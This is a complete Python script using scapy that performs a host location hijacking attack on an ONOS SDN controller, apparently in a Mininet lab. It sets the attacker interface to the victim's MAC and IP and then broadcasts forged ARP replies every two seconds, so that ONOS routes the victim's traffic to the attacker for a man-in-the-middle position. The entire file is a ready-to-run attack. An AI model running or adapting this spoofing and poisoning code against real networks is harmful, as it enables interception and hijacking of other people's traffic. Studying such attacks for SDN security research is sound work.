#!/usr/bin/env python3
"""
Host Location Hijacking -> Man-in-the-Middle (run on the attacker, atk).
1) Adopt the victim's identity (MAC + IP) so traffic for the victim is
   received and answered here.
2) Continuously poison ONOS's host table so the controller delivers the
   victim's traffic to the attacker's port.
Stop with Ctrl+C.
"""
import os, time
from scapy.all import Ether, ARP, sendp

VICTIM_MAC     = "00:00:00:00:00:02"   # h1's MAC (from ONOS 'hosts')
VICTIM_IP      = "10.0.0.11"           # h1's IP
ATTACKER_IFACE = "atk-eth0"
INTERVAL       = 2

# 1) Adopt the victim's identity on our interface
os.system(f"ip link set dev {ATTACKER_IFACE} down")
os.system(f"ip link set dev {ATTACKER_IFACE} address {VICTIM_MAC}")
os.system(f"ip link set dev {ATTACKER_IFACE} up")
os.system(f"ip addr add {VICTIM_IP}/24 dev {ATTACKER_IFACE} 2>/dev/null")
print(f"[*] Adopted victim identity {VICTIM_MAC} / {VICTIM_IP} on {ATTACKER_IFACE}")

# 2) Sustained Host Location Hijacking
pkt = Ether(src=VICTIM_MAC, dst="ff:ff:ff:ff:ff:ff") / \
      ARP(op=2, hwsrc=VICTIM_MAC, psrc=VICTIM_IP,
          hwdst="ff:ff:ff:ff:ff:ff", pdst=VICTIM_IP)
print(f"[*] Poisoning ONOS every {INTERVAL}s - victim's traffic will arrive here. Ctrl+C to stop.")
n = 0
try:
    while True:
        sendp(pkt, iface=ATTACKER_IFACE, verbose=False)
        n += 1
        print(f"[+] poison #{n} - ONOS places {VICTIM_IP} at the attacker's port")
        time.sleep(INTERVAL)
except KeyboardInterrupt:
    print(f"\n[*] Stopped after {n} poisonings.")
